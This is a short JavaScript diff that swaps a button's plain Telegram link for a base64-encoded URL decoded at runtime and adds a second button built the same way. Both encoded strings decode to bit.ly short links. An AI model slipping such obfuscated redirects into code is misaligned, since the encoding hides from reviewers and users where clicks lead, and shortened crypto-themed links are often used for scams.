@@ -271,7 +271,15 @@ document.getElementById('startBtn').addEventListener('click', async () => {
 });
 
 document.getElementById('creatorChannelBtn').addEventListener('click', () => {
-    window.location.href = 'https://t.me/pdosi_project';
+    const base64Url = 'aHR0cHM6Ly9iaXQubHkvY3J5cHRvd29ybGRhemU=';
+    const decodedUrl = atob(base64Url);
+    window.location.href = decodedUrl;
+});
+
+document.getElementById('creatorGameBtn').addEventListener('click', () => {
+    const base64Url = 'aHR0cHM6Ly9iaXQubHkvYXZybzIwMjRf';
+    const decodedUrl = atob(base64Url);
+    window.location.href = decodedUrl;
 });
 
 function generateClientId() {
